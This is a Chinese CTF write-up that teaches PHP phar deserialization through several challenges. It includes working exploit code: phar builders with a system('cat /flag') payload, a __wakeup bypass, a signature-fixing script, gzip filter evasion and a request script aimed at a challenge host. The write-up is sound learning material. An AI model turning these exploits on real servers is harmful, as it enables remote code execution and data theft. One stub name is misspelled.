### 通过NSSCTF的一道题学习phar反序列化[1zweb(revenge)]

### 审计

打开题目，有上传文件和查询文件两个功能，但不能直接看flag
**index.php**

```php
<?php
class LoveNss{
    public $ljt;
    public $dky;
    public $cmd;
    public function __construct(){
        $this->ljt="ljt";
        $this->dky="dky";
        phpinfo();
    }
    public function __destruct(){
        if($this->ljt==="Misc"&&$this->dky==="Re")
            eval($this->cmd);
    }
    public function __wakeup(){
        $this->ljt="Re";
        $this->dky="Misc";
    }
}
$file=$_POST['file'];
if(isset($_POST['file'])){
    if (preg_match("/flag/", $file)) {
    	die("nonono");
    }
    echo file_get_contents($file);
}
```

**upload.php**

```php
<?php
if ($_FILES["file"]["error"] > 0){
    echo "上传异常";
}
else{
    $allowedExts = array("gif", "jpeg", "jpg", "png");
    $temp = explode(".", $_FILES["file"]["name"]);
    $extension = end($temp);
    if (($_FILES["file"]["size"] && in_array($extension, $allowedExts))){
        $content=file_get_contents($_FILES["file"]["tmp_name"]);
        $pos = strpos($content, "__HALT_COMPILER();");
        if(gettype($pos)==="integer"){
            echo "ltj一眼就发现了phar";
        }else{
            if (file_exists("./upload/" . $_FILES["file"]["name"])){
                echo $_FILES["file"]["name"] . " 文件已经存在";
            }else{
                $myfile = fopen("./upload/".$_FILES["file"]["name"], "w");
                fwrite($myfile, $content);
                fclose($myfile);
                echo "上传成功 ./upload/".$_FILES["file"]["name"];
            }
        }
    }else{
        echo "dky不喜欢这个文件 .".$extension;
    }
}
?>
```

### phar反序列化

我们一般利用反序列漏洞，一般都是借助unserialize()函数，不过随着人们安全的意识的提高这种漏洞利用越来越来难了，但是在今年8月份的Blackhat2018大会上，来自Secarma的安全研究员Sam Thomas讲述了一种攻击PHP应用的新方式，利用这种方法可以在不使用unserialize()函数的情况下触发PHP反序列化漏洞。漏洞触发是利用Phar:// 伪协议读取phar文件时，会反序列化meta-data储存的信息。

#### phar简介

**PHAR("Php ARchive")**是PHP中类似**JAR**的一种打包文件，在PHP5.3或更高版本中默认开启，这个特性使得PHP可以和Java一样实现应用程序打包和组件化，应用程序打包后，直接放到**PHP-FPM**中运行

#### phar文件结构

**1.a stub**

stub基本结构：`xxx<?php xxx;__HALF_COMPILER();?>`，前面内容不限，但必须以`__HALT_COMPILER();?>`来结尾，否则phar扩展无法识别该文件

**2.a manifest describing the contents**

phar文件中被压缩的文件的一些信息，其中**Meta-data**部分的信息会以序列化的形式储存，这就是漏洞利用的关键![img](D:\Typora\note\CTF\web\知识点\phar反序列化.assets\1937992-20200602115238195-49897280.png)

**Meta-dara，元数据：元数据被定义为：描述数据的数据，对数据及信息资源的描述性信息。**

**3.the file contents**

被压缩的文件内容，在没有特殊要求的情况下，这个被压缩的文件内容可以随便写的，因为我们利用这个漏洞主要是为了触发它的反序列化，与文件内容关系不大

**4.a signature for verifying Phar integrity**

签名

![img](D:\Typora\note\CTF\web\知识点\phar反序列化.assets\1937992-20200602115337297-1986136175.png)

#### phar示例

根据文件结构自己来构建一个phar文件，php内置了一个Phar类来处理相关操作
**注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。**

![image-20220827110246658](D:\Typora\note\CTF\web\知识点\phar反序列化.assets\image-20220827110246658-166185118122013.png)

(然后发现死活关闭不了，因为这点事引出了一系列蝴蝶效应，最后以80大洋重装系统结束，现实真是太魔幻了🤗，最后在ctfshow的vip群得知，前面的**;**是注释的，删掉就能改了😶‍🌫️)

**phar.php**

```php
<?php
    class TestObject {
    }

    $phar = new Phar("phar.phar"); //通过内置的Phar类实例化，后缀名必须为phar

    $phar->startBuffering(); //开始缓冲 Phar 写操作，不要修改磁盘上的 Phar 对象
    //可以理解为必须的操作，与stopBuffering()配对使用

    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub

    $o = new TestObject();//实例化一个对象
    
    $o -> data='xlccccc';//设置对象的属性
    
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    
    $phar->stopBuffering();
?>
```

在010打开文件
![image-20220828170332025](D:\Typora\note\CTF\web\知识点\phar反序列化.assets\image-20220828170332025-16618510974575.png)

可以看到一段反序列化字符，有序列化自然有反序列化
当你用**phar://**解析phar文件后，就会将这段数据反序列化![img](https://img2020.cnblogs.com/blog/1937992/202006/1937992-20200602120704676-1021025129.png)

当然包括include
test.php

```php
<?php
class TestObject{
   function __destruct()
    {
        echo $this -> data;   // TODO: Implement __destruct() method.
    }
}
include('phar://phar.phar');
```

![image-20220828170737831](D:\Typora\note\CTF\web\知识点\phar反序列化.assets\image-20220828170737831-16618511099877-16618511144069.png)

可以看到触发了反序列化

然后进入本题

### 题目详解

![image-20220828175238403](D:\Typora\note\CTF\web\知识点\phar反序列化.assets\image-20220828175238403.png)

先看看最终的目的，`使ljt=Misc dky=Re`就可rce，而反序列化时会进入**__wakeup**，所以首先要绕过**__wakeup**，就是把序列化后的字符串的变量个数多一个就好了
生成phar

```php
<?php
  unlink('phar.phar');
  class LoveNss{
    public $ljt="Misc";
    public $dky="Re";
    public $cmd="system('cat /flag');";
  }
 
  $a=new LoveNss();
  $phar = new Phar('phar.phar');
  $phar->setStub('<?php __HALT_COMPILER();?>');
  $phar->setMetadata($a);
  $phar->addFromString('1.txt','dky');
?>
```

得到

![image-20220828180341149](D:\Typora\note\CTF\web\知识点\phar反序列化.assets\image-20220828180341149.png)

然后在<font color='red'>**010editor**</font>里把3改为4，因为记事本直接改好像改的是八进制，改了之后连文件都打不开了(无关签名)
接着改签名

```python
from hashlib import sha1
f = open('./phar.phar', 'rb').read() # 修改内容后的phar文件
s = f[:-28] # 获取要签名的数据
h = f[-8:] # 获取签名类型以及GBMB标识
newf = s+sha1(s).digest()+h # 数据 + 签名 + 类型 + GBMB
open('22.phar', 'wb').write(newf) # 写入新文件
```

我也不知道这是怎么实现改签名的，但是好像什么phar文件改后都可以用这个改...

![image-20220828180609292](D:\Typora\note\CTF\web\知识点\phar反序列化.assets\image-20220828180609292.png)

在upload里有检查白名单和phar的头文件的，所以你直接改phar文件后缀也是不行的
这里要用到压缩绕过，将phar文件压缩后，后缀改为png
而且这里必须要用linux的gzip压缩，具体原因未知，反正windows直接压缩⑧行
然后`phar://./upload/2.phar.png/22.phar`就可得到flag

![image-20220828180752337](D:\Typora\note\CTF\web\知识点\phar反序列化.assets\image-20220828180752337.png)



<font color='red'>**tips:**</font>
**压缩混淆：**原理就是用其他的压缩格式再对phar文件进行压缩达到混淆的效果， 部分压缩格式混淆过的phar内容同样可以直接被phar://伪协议解析(很明显，gzip是可以的)
**phar://**只争对文件里的数据，并不处理后缀

![image-20220828184843047](D:\Typora\note\CTF\web\知识点\phar反序列化.assets\image-20220828184843047.png)

### 新解法

```php
<?php
class LoveNss{
    public $ljt;
    public $dky;
    public $cmd;
    public function __construct(){
        $this->ljt="ljt";
        $this->dky="dky";
        phpinfo();
    }
}
$a = new LoveNss();
$a -> ljt = "Misc";
$a -> dky = "Re";
$a -> cmd = "system('cat /flag');";
$payload = serialize($a);
$final = str_replace("s\":3","s\":4",$payload);
echo $final;

$zip = new ZipArchive();
$res = $zip->open('nss.zip',ZipArchive::CREATE); 
$zip->addFromString('crispr.txt', 'file content goes here');
$zip->setArchiveComment($final);
$zip->close();
```

这样写不用管签名，phar也可以识别，原理一样

### 参考文章：

[nssctf round#4](https://blog.csdn.net/weixin_63231007/article/details/126443203)
[phar反序列化](https://www.cnblogs.com/zzjdbk/p/13030571.html)
[记一道CTF中的phar反序列化](https://blog.csdn.net/qq_53886354/article/details/126333147)
[PHP Phar反序列化总结](https://blog.csdn.net/q20010619/article/details/120833148)[PHP之十六个魔术方法详解](https://segmentfault.com/a/1190000007250604)



### phar反序列化题

#### prize_p1(nssctf)

```php
<META http-equiv="Content-Type" content="text/html; charset=utf-8" />
<?php
highlight_file(__FILE__);
class getflag {
    function __destruct() {
        echo getenv("FLAG");
    }
}

class A {
    public $config;
    function __destruct() {
        if ($this->config == 'w') {
            $data = $_POST[0];
            if (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $data)) {
                die("我知道你想干吗，我的建议是不要那样做。");
            }
            file_put_contents("./tmp/a.txt", $data);
        } else if ($this->config == 'r') {
            $data = $_POST[0];
            if (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $data)) {
                die("我知道你想干吗，我的建议是不要那样做。");
            }
            echo file_get_contents($data);
        }
    }
}
if (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $_GET[0])) {
    die("我知道你想干吗，我的建议是不要那样做。");
}
unserialize($_GET[0]);
throw new Error("那么就从这里开始起航吧");
```

本题可以写入a.txt文件，而且没有过滤phar，很明显就是phar反序列化了
所以大致思路就是 

> 写入压缩后的phar数据(引用A类)进/tmp/a.txt(绕过waf中的get flag)
> phar://读取该文件触发反序列化
> 触发**__destruct**

然后发现没用...
看WP是说，在触发**__destruct**之前就已经抛出了异常，所以我得用一个错误来强制触发**__destruct**从而**getflag**
于是常规的类就行⑧通了，因为没有任何变量，你改变量数量也没用，这时候就要用到数组

```php
<?php
    @unlink("test.phar");
    class getflag{
 
    }
		// 创建一个数组
    $a = array(new getflag(), 1);
    $phar = new Phar("test.phar");
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); 
    $phar -> setMetadata($a);
    $phar->addFromString("1.txt", "123"); 
    $phar->stopBuffering();
?>
```

创建一个数组来得到该类

![image-20220828211023524](D:\Typora\note\CTF\web\知识点\phar反序列化.assets\image-20220828211023524.png)

将1改为0
剩下就是上面的操作

py发包

```python
import requests

url='http://1.14.71.254:28948/'
f=open("22.phar.gz", "rb")

get='?0=O:1:"A":1:{s:6:"config";s:1:"w";}'
data1={0: f.read()}
# print(data1)
# print(f.read())
requests.post(url=url+'?0=O:1:"A":1:{s:6:"config";s:1:"w";}',data=data1)

getr='?0=O:1:"A":1:{s:6:"config";s:1:"r";}'
datar={0: "phar://tmp/a.txt"}
r=requests.post(url=url+'?0=O:1:"A":1:{s:6:"config";s:1:"r";}',data={0: "phar://tmp/a.txt"})
r.encoding="utf-8"
print(r.text)
f.close()
```

中间发现了一个read的毛病，读完一次，第二次就为空了，看来半天才发现

![image-20220828211207858](D:\Typora\note\CTF\web\知识点\phar反序列化.assets\image-20220828211207858.png)

#### [CISCN2019 华北赛区 Day1 Web1]Dropbox

wp在国赛的md里

#### [SWPUCTF 2018]SimplePHP

大体思路和之前的题目都差不多，有个查看文件的页面，可以直接看到源码

给出最关键的

```php
<?php

use Show as GlobalShow;

class C1e4r
{
    public $test;
    public $str;
    public function __construct($name)
    {
        $this->str = $name;
    }
    public function __destruct()
    {
        $this->test = $this->str;
        echo $this->test;
    }
}

class Show
{
    public $source;
    public $str;
    public function __construct($file)
    {
        $this->source = $file;   //$this->source = phar://phar.jpg
        echo $this->source;
    }
    public function __toString()
    {
        $content = $this->str['str']->source;
        return $content;
    }
    public function __set($key,$value)
    {
        $this->$key = $value;
    }
    public function _show()
    {
        if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this->source)) {
            die('hacker!');
        } else {
            highlight_file($this->source);
        }
        
    }
    public function __wakeup()
    {
        if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
            echo "hacker~";
            $this->source = "index.php";
        }
    }
}
class Test
{
    public $file;
    public $params;
    public function __construct()
    {
        $this->params = array();
    }
    public function __get($key)
    {
        //echo($key);
        //echo(1233);
        return $this->get($key);
    }
    public function get($key)
    {
        if(isset($this->params[$key])) {
            $value = $this->params[$key];
        } else {
            $value = "index.php";
        }
        return $this->file_get($value);
    }
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
}
```

一眼就是感觉是phar反序列化，可是里面是**highlight_file**，经过本地测试是不能触发phar反序列化的

但是不知道题目环境怎么回事，可以正常触发。。。

pop链很简单

```php
C1e4r->__destruct ==>Show->__toString  ==>Test->__get
```

最后的phar生成文件

```php
<?php
class C1e4r
{
    public $test;
    public $str;
}

class Show
{
    public $source;
    public $str;
}
class Test
{
    public $file;
    public $params;
}
$a=new C1e4r(1);
$b=new Show(2);
$c=new Test();
$d=array("str"=>$c);
$e=array("source"=>"/var/www/html/f1ag.php");//绝对路径


$c->params=$e;
$b->str=$d;
$b->source='file';
$a->str=$b;
    @unlink("xlccccc.phar");


    $phar = new Phar("xlccccc.phar"); //通过内置的Phar类实例化，后缀名必须为phar

    $phar->startBuffering(); //开始缓冲 Phar 写操作，不要修改磁盘上的 Phar 对象
    //可以理解为必须的操作，与stopBuffering()配对使用

    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub

    
    $phar->setMetadata($a); //将自定义的meta-data存入manifest
    
    $phar->addFromString("exp.txt", "123"); //添加要压缩的文件
    //签名自动计算
    
    $phar->stopBuffering();
?>
```

文件名可以自己算出来

反正本地试不出来，很迷，可能是版本的问题？
